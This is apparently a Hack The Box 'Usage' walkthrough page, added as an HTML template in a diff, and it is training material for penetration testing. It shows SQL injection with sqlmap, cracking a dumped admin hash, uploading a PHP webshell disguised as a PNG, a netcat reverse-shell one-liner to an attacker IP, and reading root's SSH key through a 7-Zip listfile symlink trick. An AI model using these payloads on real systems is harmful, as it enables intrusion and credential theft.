@@ -1,0 +1,361 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}"> 
+</head>
+<body>
+    <h1 class="title">HTB Usage Walkthrough</h1>
+    <h2 class="subtitle">Enumeration</h2>
+
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;TARGET_IP&gt; --min-rate=2000</u>
+PORT   STATE SERVICE    VERSION
+22/tcp open  tcpwrapped
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  tcpwrapped
+|_http-title: Did not follow redirect to http://usage.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)</code></pre></div>
+
+    <p class="text">HTTP is open on the target.</p>
+    
+    <div class="code-box"><pre><code>└─$ <u>echo '&lt;TARGET_IP&gt; usage.htb' | sudo tee -a /etc/hosts</u></code></pre></div>
+
+
+        <div class="img">
+            <img src="{% static 'EthHack/images/usage/1-page.png' %}" alt="">
+            <p class="text">This page is simple login form. But the button on top right 'Admin' leads us to subdomain called 'admin.usage.htb'. Let's add the subdomain to /etc/hosts at first.</p>
+        </div>
+
+
+        <div class="code-box"><pre><code>└─$ <u>echo '&lt;TARGET_IP&gt; admin.usage.htb' | sudo tee -a /etc/hosts</u></code></pre></div>
+
+
+        <p class="text">Next step is webpage enumeration as always. Nmap and ffuf come to here. To make sure there is no additional subdomains, I reccomend you to do subdomain enumeration.</p>
+
+        <div class="code-box">
+            <pre><code>└─$ <u>gobuster dir -w &lt;YOUR_WORDLIST&gt; -u http://usage.htb -t 100 > gobuster.txt</u></code></pre>
+└─$ <u>gobuster dir -w &lt;YOUR_WORDLIST&gt; -u http://admin.usage.htb -t 100 > gobuster-admin.txt</u>
+        </div>
+        <p class="text">This host returns trashes size of 206, so exclude these with grep.</p>
+        <div class="code-box"><pre><code>└─$ <u>cat gobuster* | grep -v 206</u>
+<b>※admin.usage.htb</b>
+/.forward             (Status: 403) [Size: 162]
+/.web                 (Status: 403) [Size: 162]
+/.git_release         (Status: 403) [Size: 162]
+/.bash_history        (Status: 403) [Size: 162]
+/.svn/entries         (Status: 403) [Size: 162]
+/.swf                 (Status: 403) [Size: 162]
+/.cache               (Status: 403) [Size: 162]
+/.mysql_history       (Status: 403) [Size: 162]
+/.git/config          (Status: 403) [Size: 162]
+<b>※usage.htb</b>
+/.listing             (Status: 403) [Size: 162]
+/.history             (Status: 403) [Size: 162]
+/.gitignore           (Status: 403) [Size: 162]
+/.listings            (Status: 403) [Size: 162]
+/.forward             (Status: 403) [Size: 162]
+/.cvsignore           (Status: 403) [Size: 162]
+/.passwd              (Status: 403) [Size: 162]
+/.perf                (Status: 403) [Size: 162]
+/.gitconfig           (Status: 403) [Size: 162]
+/.cache               (Status: 403) [Size: 162]
+/.env                 (Status: 403) [Size: 162]
+/.svn                 (Status: 403) [Size: 162]
+/.cvs                 (Status: 403) [Size: 162]
+/.config              (Status: 403) [Size: 162]
+/.rhosts              (Status: 403) [Size: 162]
+/.git/HEAD            (Status: 403) [Size: 162]
+/.hta                 (Status: 403) [Size: 162]
+/.git/config          (Status: 403) [Size: 162]
+/.sh_history          (Status: 403) [Size: 162]
+/.gitk                (Status: 403) [Size: 162]
+/.mysql_history       (Status: 403) [Size: 162]
+/registration         (Status: 200) [Size: 5112]</code></pre></div>
+
+<p class="text">Though there is .git folder, we cannot download with git-dumper because its status is 403. So, there is no interesting information.</p>
+<p class="text">Also, ffuf doesn't return any additional subdomain.</p>
+<div class="code-box"><pre><code>└─$ <u>ffuf -w &lt;SUBDOMAIN_WORDLIST&gt; -u http://usage.htb -H "Host:FUZZ.usage.htb" -s -mc 200</u>
+...</code></pre></div>
+
+<p class="text">Therefore, we need to find web-vulnerability.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/usage/2-sqli.png' %}" alt="">
+    <p class="text">After browsing the page for a while, I found SQL injection point. <u>test' or 1=1;-- - </u> doesn't return error. We might use it as foothold.</p>
+</div>
+
+<p class="text">But look at this request body...</p>
+<div class="code-box"><pre><code>POST /forget-password HTTP/1.1
+Host: usage.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+Origin: http://usage.htb
+Connection: keep-alive
+Referer: http://usage.htb/forget-password
+Cookie: XSRF-TOKEN=eyJpdiI6Im9DT3VOQjYzalY4Z1JYdnNUblg3TUE9PSIsInZhbHVlIjoiN3UvZ0E2dEkwZ3BYcDd3VUxDV0dyWHM3dDdoWWFyMlNSRVI2T0Z2ZTRCTHFmRHZ6Si9OL25wY3B1SFc4VGgyZVV4MVZFMTdnNEtZNjg4OXg3bkk2T0VUWHN6cVRQRnBtWFpjSmVzUXd4VjErMDJXOEhxODcwNDllbXNERW03TUgiLCJtYWMiOiI4ODRmYjg2MzM4MTQ3NGY5YTdiMjU5YTJmZmE0OTBlOTcyYmQ1MjYyNDMxZmQ2YTMzZDliYWQxZWU5NDM0ZTc2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InBBRTlObEF2dFR4bDg3UkU4b3dHZWc9PSIsInZhbHVlIjoiLzlXcmVOTVJ5alM3Vlo4dzdQTUlJRldhRWtuckMvMFdEKzBLdlhvTnpPRkdjL0xuUndEU01TbGwzK1ZzTnZEL3daRG9IVmVNR1kwYSs4WmgyMDVGL0JmSFZMcmkyTmd2aFo3MU1jR3BjUDE5cG1UQ2NQRGZXV2pmRHVhUk5aSDAiLCJtYWMiOiI5NjcyNTlhYTdjYjZmMDQ0ZDkwODgyNTQ5ZjY1NDVhNzU0YjllYTE0MmU5NGU4ODYxZjAxNjIwN2U5ZDc0YTRlIiwidGFnIjoiIn0%3D
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+_token=LrF0ajeYF2NAZrMmk5KI1eOCLLEcgKB5NnWK3zc8&email=a</code></pre></div>
+
+<p class="text">It includes XSRF-TOKEN. So we need to include it to not be detected. Copy and paste this request body to a file on your machine. I named it 'req-b.req'.</p>
+
+<div class="code-box"><pre><code>└─$ <u>sqlmap -r req-b.req -p email --batch --level 3</u>
+<b>snip...</b>
+[04:48:48] [INFO] target URL appears to be UNION injectable with 8 columns
+<b>snip...</b>
+[04:53:15] [INFO] testing MySQL
+[04:53:16] [INFO] confirming MySQL
+[04:53:19] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+<b>snip...</b></code></pre></div>
+<p class="text">As it says, the reset password form is sql injectable. Let's extract database name at first.</p>
+
+<div class="code-box"><pre><code>└─$ <u>sqlmap -r reset.req -p email --batch --level 3 --dbs</u>
+<b>snip...</b>
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] usage_blog
+<b>snip...</b>
+</code></pre></div>
+
+<p class="text">The main database for the http must be usage_blog. So, we next find out table names and data in it.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10</u>
+<b>snip...</b>+------------------------+
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
+<b>snip...</b></code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump</u>
++----+---------------+---------+--------------------------------------------------------------+---
+| id | name          | avatar  | password                                                     | username>
++----+---------------+---------+--------------------------------------------------------------+---
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin>
++----+---------------+---------+--------------------------------------------------------------+---</code></pre></div>
+
+<p class="text">Then, we need to decode hashed password. john would be enough for the process. </p>
+<div class="code-box"><pre><code>└─$ <u>echo $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 > hash</u>
+└─$ <u>john hash -w &lt;../rockyou.txt&gt;</u>
+<b>snip...</b>
+?:whatever1
+<b>snip...</b></code></pre></div>
+
+<p class="text">We got admin user <u>admin @ whatever1</u>. Let's login to admin panel.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/usage/4-webshell.png' %}" alt="">
+    <p class="text">Go to the setting page, we can upload arbitrary file. But we cannot upload files rather than .png file. However, if the file extension is .png, we can upload whatever the data it has. Therefore, we can make webshell.php file on our machine, and rename it to webshell.png. </p>
+</div>
+
+
+<p class="text">I use simple webshell by joswr1ght...</p>
+<div class="code-box"><pre><code>&lt;html>
+&lt;body>
+&lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?>">
+&lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+&lt;input type="SUBMIT" value="Execute">
+&lt;/form>
+&lt;pre>
+&lt;?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+&lt;/pre>
+&lt;/body>
+&lt;/html>
+
+mv webshell.php webshell.png
+</code></pre></div>
+
+
+<p class="text">And rename the uploading file via burpsuite.</p>
+
+<div class="img">
+    <img src="" alt="">
+    <p class="text">Then, head to <u>http://admin.usage.htb/uploads/images/webshell.jpg.php</u> and send rev-shell code.</p>
+</div>
+
+<div class="code-box"><pre><code>nc -lvnp 4444 <u class="green">On your machine</u>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f <u class="green">#On the webshell</u></code></pre></div>
+
+
+<p class="text">You've got reverse shell.</p>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+
+<p class="text">You can find id_rsa file on /home/dash/.ssh. I reccomend you to change to ssh conneciton because reverse shell is often unstable.</p>
+
+<div class="code-box"><pre><code>└─$ <u>nano id_rsa</u>
+-----BEGIN OPENSSH PRIVATE KEY-----                                                 <u class="green">#paste this.</u>
+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
+63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
+-----END OPENSSH PRIVATE KEY-----
+
+└─$ <u>chmod 600 id_rsa</u>
+└─$ <u>ssh -i id_rsa dash@usage.htb</u></code></pre></div>
+
+
+<p class="text">You can see another account 'xander'. Also, the user dash doesn't have sudo file, so we need to find other vector for lateral movement. It's standard way to see open port.</p>
+<div class="code-box"><pre><code>dash@usage:~$ ls -la
+total 52
+drwxr-x--- 6 dash dash 4096 Jul 12 21:18 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+-rw-r--r-- 1 dash dash    5 Jul 12 21:18 .monit.pid
+-rw------- 1 dash dash 1192 Jul 12 21:16 .monit.state
+-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+-rw-r----- 1 root dash   33 Aug 24  2023 user.txt</code></pre></div>
+
+<p class="text">We can find interesting information in home directory. The 'monitrc' is the mounting system. For mount some directory, it requires configuration. So it might have credential for xander.</p>
+
+<div class="code-box"><pre><code>dash@usage:~$ cat .monitrc
+    #Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd</code></pre></div>
+
+     <p class="text">Try su command with this password.</p>
+
+     <div class="code-box"><pre><code>dash@usage:~$ su xander
+Password: 
+<u>xander@usage:/home/dash$</u></code></pre></div>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>xander@usage:~$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management</code></pre></div>
+
+    <div class="code-box"><pre><code>xander@usage:~$ usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3):</code></pre></div>
+
+<p class="text">See. This management system can backup some directory. Let's run it and observe functionality.</p>
+
+<div class="code-box"><pre><code>xander@usage:~$ sudo usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)
+
+Scanning the drive:
+2984 folders, 18017 files, 113893616 bytes (109 MiB)
+
+Creating archive: /var/backups/project.zip
+
+Items to compress: 21001
+
+                                                                               
+Files read from disk: 18017
+Archive size: 54860778 bytes (53 MiB)
+Everything is Ok</code></pre></div>
+
+<p class="text">This type of backup system often makes us possible to read file by using hyperlink. Let's try to read id_rsa of root.</p>
+
+
+
+<div class="code-box"><pre><code>xander@usage:/var/www/html$ touch @id_rsa
+xander@usage:/var/www/html$ ls
+@id_rsa  project_admin  usage_blog
+xander@usage:/var/www/html$  ln -s /root/.ssh/id_rsa id_rsa
+xander@usage:/var/www/html$  sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+<u class="green">snip...</u>
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+----------------
+Scan WARNINGS: 7
+<u class="green">snip...</u></code></pre></div>
+
+<p class="text">Succeeded. After removing :No more files texts, we can use it like before we established connection with dash user. Root flag is located to /root/root.txt.</p>
+
+</body>
+</html>
